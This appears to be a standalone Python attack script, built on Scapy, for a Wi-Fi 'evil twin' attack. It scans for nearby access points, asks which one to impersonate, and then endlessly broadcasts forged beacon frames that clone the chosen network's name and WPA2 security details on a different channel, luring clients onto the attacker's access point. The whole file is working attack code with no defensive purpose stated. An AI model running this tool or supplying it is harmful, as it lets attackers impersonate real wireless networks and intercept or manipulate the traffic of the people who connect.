import argparse

import netifaces
from scapy.all import *
from scapy.layers.dot11 import Dot11Beacon, Dot11Elt, Dot11, RadioTap

# Args parsing


parser = argparse.ArgumentParser(prog="Scapy Fake channel Evil Tween attack",
                                 usage="evil_twin_fake_channel.py -i wlp2s0mon -b 00:11:22:33:44:55 ",
                                 allow_abbrev=False)

parser.add_argument("-i", "--Interface", required=True,
                    help="The interface that you want to send packets out of, needs to be set to monitor mode")
parser.add_argument("-b", "--BSSID", required=False,
                    help="The BSSID of the AP you want people to connect to (Will default to interface's mac if not specified)",
                    default="")

args = parser.parse_args()

# Global variables
BSSIDs = []
BSSIDPackets = {}


# We sniff all Dot11 beacon packets, and store 1 packet per AP bssid
def packetHandler(p):
    """
    Packet handler to analyse packet and discover new AP on the network
    :param p: the packet to analyse
    """
    if p.haslayer(Dot11Beacon) and p.addr3 not in BSSIDs:
        BSSIDs.append(str(p.addr3))
        BSSIDPackets[str(p.addr3)] = p
        DisplayInfoAP(str(p.addr3))


def DisplayInfoAP(bssid):
    """
    Display information about the AP
    :param bssid: the BSSID of the AP to display
    """
    p = BSSIDPackets[bssid]
    print("{:03d}) {} {} {:d} {:-32}".format(
        BSSIDs.index(bssid), p.addr3, p.dBm_AntSignal, int(ord(p[Dot11Elt:3].info)), p.info.decode("utf-8")))
    print("Press CTRL+C to stop scanning, and select target", end="\r")


def _sniff(e):
    sniff(iface=args.Interface, prn=packetHandler, stop_filter=lambda p: e.is_set())


def detectAP():
    """
    Detect AP based on beacon emission and display a list of detected networks
    The value displayed are the value at the first detection and are not updated
    """
    print("id) <Mac address> <Signal strength, lower is better> <Channel Number> <SSID>")

    # Spawn a thread for detecting networks
    e = threading.Event()
    t = threading.Thread(target=_sniff, args=(e,))
    t.start()

    # Wait for interruption to stop thread
    try:
        while True:
            time.sleep(1)
    except (KeyboardInterrupt, SystemExit):
        e.set()  # signal thread to stop
        while t.is_alive():
            t.join(1.0)


def select_bssid():
    """
    Ask the user to select a bssid in the list
    :return:  the id selected -1 if list is empty
    """
    bssid_index = -1
    if len(BSSIDs) == 0:
        return bssid_index
    while 0 > bssid_index or len(BSSIDs) - 1 < bssid_index:
        try:
            bssid_index = int(input(
                "\nPlease Select the number associated with the network you wish to impersonate [0-{:d}] : ".format(
                    len(BSSIDs) - 1)))
        except ValueError:
            print("Invalid input")
    return bssid_index


def fake_channel(target_packet):
    """
    Generate a fake clone network on a different channel based on a beacon trame of another network
    :param target_packet: the packet containing the beacon trame of the network to spoof
    """
    interface = netifaces.ifaddresses(args.Interface)[netifaces.AF_LINK]

    # Set given BSSID or use default
    dot11 = Dot11(type=0, subtype=8, addr1=interface[0]['broadcast'], addr2=interface[0]['addr'],
                  addr3=interface[0]['addr'] if not args.BSSID else args.BSSID)

    # Enable authentication in the beacon as we want to spoof an authenticated network.
    beacon = Dot11Beacon(cap='ESS+privacy')

    essid = Dot11Elt(ID='SSID', info=target_packet.info,
                     len=len(target_packet.info))

    chn = int(ord(target_packet[Dot11Elt:3].info))

    chn = chn - 6 if chn > 6 else chn + 6

    channel = Dot11Elt(ID='DSset', info=chr(chn))

    # RSN payload taken from https://www.4armed.com/blog/forging-wifi-beacon-frames-using-scapy/
    rsn = Dot11Elt(ID='RSNinfo', info=(
        '\x01\x00'  # RSN Version 1
        '\x00\x0f\xac\x02'  # Group Cipher Suite : 00-0f-ac TKIP
        '\x02\x00'  # 2 Pairwise Cipher Suites (next two lines)
        '\x00\x0f\xac\x04'  # AES Cipher
        '\x00\x0f\xac\x02'  # TKIP Cipher
        '\x01\x00'  # 1 Authentication Key Managment Suite (line below)
        '\x00\x0f\xac\x02'  # Pre-Shared Key
        '\x00\x00'))  # RSN Capabilities (no extra capabilities)

    frame = RadioTap() / dot11 / beacon / essid / channel / rsn

    frame.show()

    # Infinite loop to continuously sending packets
    sendp(frame, iface="wlan0mon", inter=0.100, loop=1)


detectAP()
selected_id = select_bssid()
if selected_id == -1:
    print("No AP detected. Exiting...")
    exit()
fake_channel(BSSIDPackets[BSSIDs[selected_id]])
